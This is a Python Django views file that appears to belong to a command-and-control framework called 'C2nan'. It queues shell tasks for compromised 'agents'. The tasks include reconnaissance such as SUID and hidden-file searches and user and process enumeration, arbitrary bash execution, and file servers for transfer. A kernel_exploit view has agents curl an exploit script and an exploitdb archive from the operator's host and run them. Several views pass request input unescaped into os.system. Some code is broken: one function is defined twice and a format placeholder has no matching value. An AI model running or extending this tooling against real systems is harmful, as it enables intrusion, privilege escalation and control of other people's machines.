import os
from blog.views import *
from blog.models import *
from django.http import HttpResponse , JsonResponse

current_path= os.path.dirname(os.path.abspath(__file__))
tools_path = os.path.normpath(current_path+os.sep+os.pardir)+"/Tools&Scripts"

#Done
def Apache(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/Apache-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#Done
def Avail_sh(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = " echo 'C2nan:#/ \n\n=========== Lists_available_shells: ===========';cat /etc/shells 2>/dev/null"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done    
def Cronjobs(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/cronjobs-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return render(request, 'blog/listeners.html')
    else:
        return render(request, 'blog/listeners.html')


#Done
def Hidden_files(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = 'echo "C2nan:#/ \n\n===========Hidden_Files:==========="; find / -name ".*" -type f ! -path "/proc/*" ! -path "/usr/*" ! -path "/opt/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null || find /root -name ".*" -type f 2>/dev/null'
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done
def lsof(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = " echo 'C2nan:#/ \n\n===========lsofList_open_files===========';lsof -i"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#DOne    
def OS_info(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/OS_info-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

#Done
def ProcessesLinux(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = " echo 'C2nan:#/ \n\n===========_Running_Services===========';ps aux"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
#DOne    
def selinux(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = " echo 'C2nan:#/ \n\n===========Check_if_selinux_is_enabled:===========';sestatus 2>/dev/null"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done
def SpecialPermissions(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = " echo 'C2nan:#/ \n\n===========Special_Permissions==========='; find / -type f -perm  -04000  -ls 2>/dev/null   & find / -type f -perm  -02000  -ls 2>/dev/null"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#DOne
def TCP_UDP(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/TCP_UDP-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


#Done
def UserPermissions(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/usr_priv-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#Done
def linusrs_info(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        f = open("{}".format(current_path+"/usrs_info-file"), "rt")
        task = f.read()
        f.close()
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
#Done    
def Whoami(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        task = "echo 'C2nan:#/ \n\n==========whoami===========';whoami;echo '=========';echo 'Current user group:';id 2>/dev/null"
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
#Logic Error    
def LinuxChangeDirectory(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        path = request.POST['path']
        task = "cd {}".format(path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done    
def LinuxChmod(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        mode = request.POST['mode']
        filePath= request.POST['filePath']
        task = "chmod {} {}".format(mode,filePath)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#Done    
def Linuxcp(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        path1 = request.POST['path1']
        path2= request.POST['path2']
        task = "cp {} {}".format(path1,path2)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    
#Need to check   
def Linuxgcc(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        cfile = request.POST['cfile']
        option= request.POST['option']
        bfile= request.POST['bfile']
        task = "gcc {} {} {}".format(cfile, option, bfile)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done    
def LinuxDirectoryListing_Details(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        path = request.POST['path']
        task = "echo 'C2nan:#/ \n\n======== {0} listing========';ls -la {0}".format(path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done        
def LinuxDirectoryListing(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        path = request.POST['path']
        task = "echo 'C2nan:#/ \n\n======== {0} listing========';ls {0}".format(path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done    
def LinuxMakeDirectory(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        dirName = request.POST['dirName']
        task = "mkdir {}".format(dirName)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
####Need to check
def LinuxNetdiscover(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        option = request.POST['option']
        atr = request.POST['atr']
        task = "netdiscover {} {}".format(option, atr)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done    
def LinuxTouch(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        fileName = request.POST['fileName']
        task = "touch {}".format(fileName)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    

 ###### command isn't sent in POST request   
def LinuxBash(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        command = request.POST['command']
        task = "{}".format(command)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
#Done
#general
#But Need to filter some uncommon chars      
def ffuf(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        arg = request.POST['arg']
        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
        os.system(" echo 'C2nan:#/ \n\n===============Fuzzing===============';ffuf {} >> {} ; echo 'C2nan:#/ \n\n===============Fuzzing===============';".format(arg,result_path))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
# def fbing(request, agent='' , iprange=''):
#     if request.method=='POST':
#         result_path = "../data/listeners/agents/{}/results".format(agent)
#         os.system(" echo 'C2nan:#/ \n\n===============FPING O/P===============';fping -asgq {} >> {} ".format(iprange,result_path))
#     else:
#         return render(request, 'blog/listeners.html')


#Done    
def ExecuteCommandWithSpecUser(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        username = request.POST['username']
        password = request.POST['password']
        command = request.POST['command']
        data = Agent.objects.get(name = agent)
        agentip = data.ip
        result_path = current_path+"/../../data/listeners/agents/{}/results".format(agent)
        os.system("sshpass -p '{}' ssh -oHostKeyAlgorithms=+ssh-dss {}@{} '{}' >> {}".format(password,username,agentip,command,result_path))
        # task='echo "su - {} <<! >/dev/null 2>&1\n{}\n{}\n\!" > test;chmod +x test;bash test'.format(username,password,command)
        # task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        # with open(task_path, "w") as f:
        #     f.write(task)
        #     f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#Done
def Linuxdownload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        url = request.POST['url']
        output = request.POST['output']
        task='wget {} -o {}'.format(url,output)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

def open_pythonserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system(" echo 'C2nan:#/ \n\n===============Python Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} python3 -m http.server --directory {directory} {serverport};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def open_SMBserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system(" echo 'C2nan:#/ \n\n===============SMB Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout} impacket-smbserver share -smb2support {directory} -port {port};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')     


def open_FTPserver(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system(" echo 'C2nan:#/ \n\n===============FTP Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')   


def open_PY_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system(" echo 'C2nan:#/ \n\n===============Python Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m uploadserver --port {serverport} --directory {directory};".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')



def open_FTP_UploadServer(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        timeout = request.POST['timeout']
        serverport = request.POST['serverport']
        directory = request.POST['directory']
        result_dir= current_path+"/../../data/listeners/agents/{}/".format(agent)
        result_path = result_dir+"results"
        os.system(" echo 'C2nan:#/ \n\n===============FTP Upload Server===============\nFor {timeout} seconds' >> {result_path}; timeout {timeout}  python3 -m pyftpdlib --port {serverport} --directory {directory} --write;".format(timeout,result_path,directory,serverport))
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')


def Linuxdownload(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        current_user = request.user
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId , user_id =current_user.id )
        agentTask.save()
        url = request.POST['url']
        output = request.POST['output']
        task='sudo kill 9 $(pidof "bash /tmp/bash")'.format(url,output)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')

#automated kernel exploit module
def kernel_exploit(request):
    if request.method=='POST':
        agent = request.POST['agent']
        agentId = request.POST['agentId']
        moduleId = request.POST['moduleId']
        agentTask = AgentTasks(agent_id = agentId , module_id = moduleId)
        agentTask.save()
        listenerdata = ListenerForm.objects.order_by("-created_date").get()
        ip = listenerdata.ip
        os.system("timeout 60 python -m http.server 5201 --directory {} & ".format(tools_path))
        
        task= 'curl -o /tmp/kernel_exploit.sh http://{0}:5201/Exploitation/linux/kernel_exploit.sh;curl -o /tmp/exploitdb.zip http://{0}:5201/Exploitation/linux/exploitdb-main.zip;chmod +x /tmp/kernel_exploit.sh;bash /tmp/kernel_exploit.sh'.format(ip,tools_path)
        task_path = os.path.normpath(current_path+os.sep+os.pardir+os.sep+os.pardir)+"/data/listeners/agents/{}/tasks".format(agent)
        
        with open(task_path, "w") as f:
            f.write(task)
            f.close()
        return JsonResponse({},status=200)
    else:
        return render(request, 'blog/listeners.html')
    
    #wget http://192.168.100.8:5201/Exploitation/linux/kernel_exploit.sh -O /tmp/kernel_exploit.sh;wget http://192.168.100.8:5201/Exploitation/linux/exploitdb-main.zip -O /tmp/exploitdb.zip;chmod +x /tmp/kernel_exploit.sh;bash /tmp/kernel_exploit.sh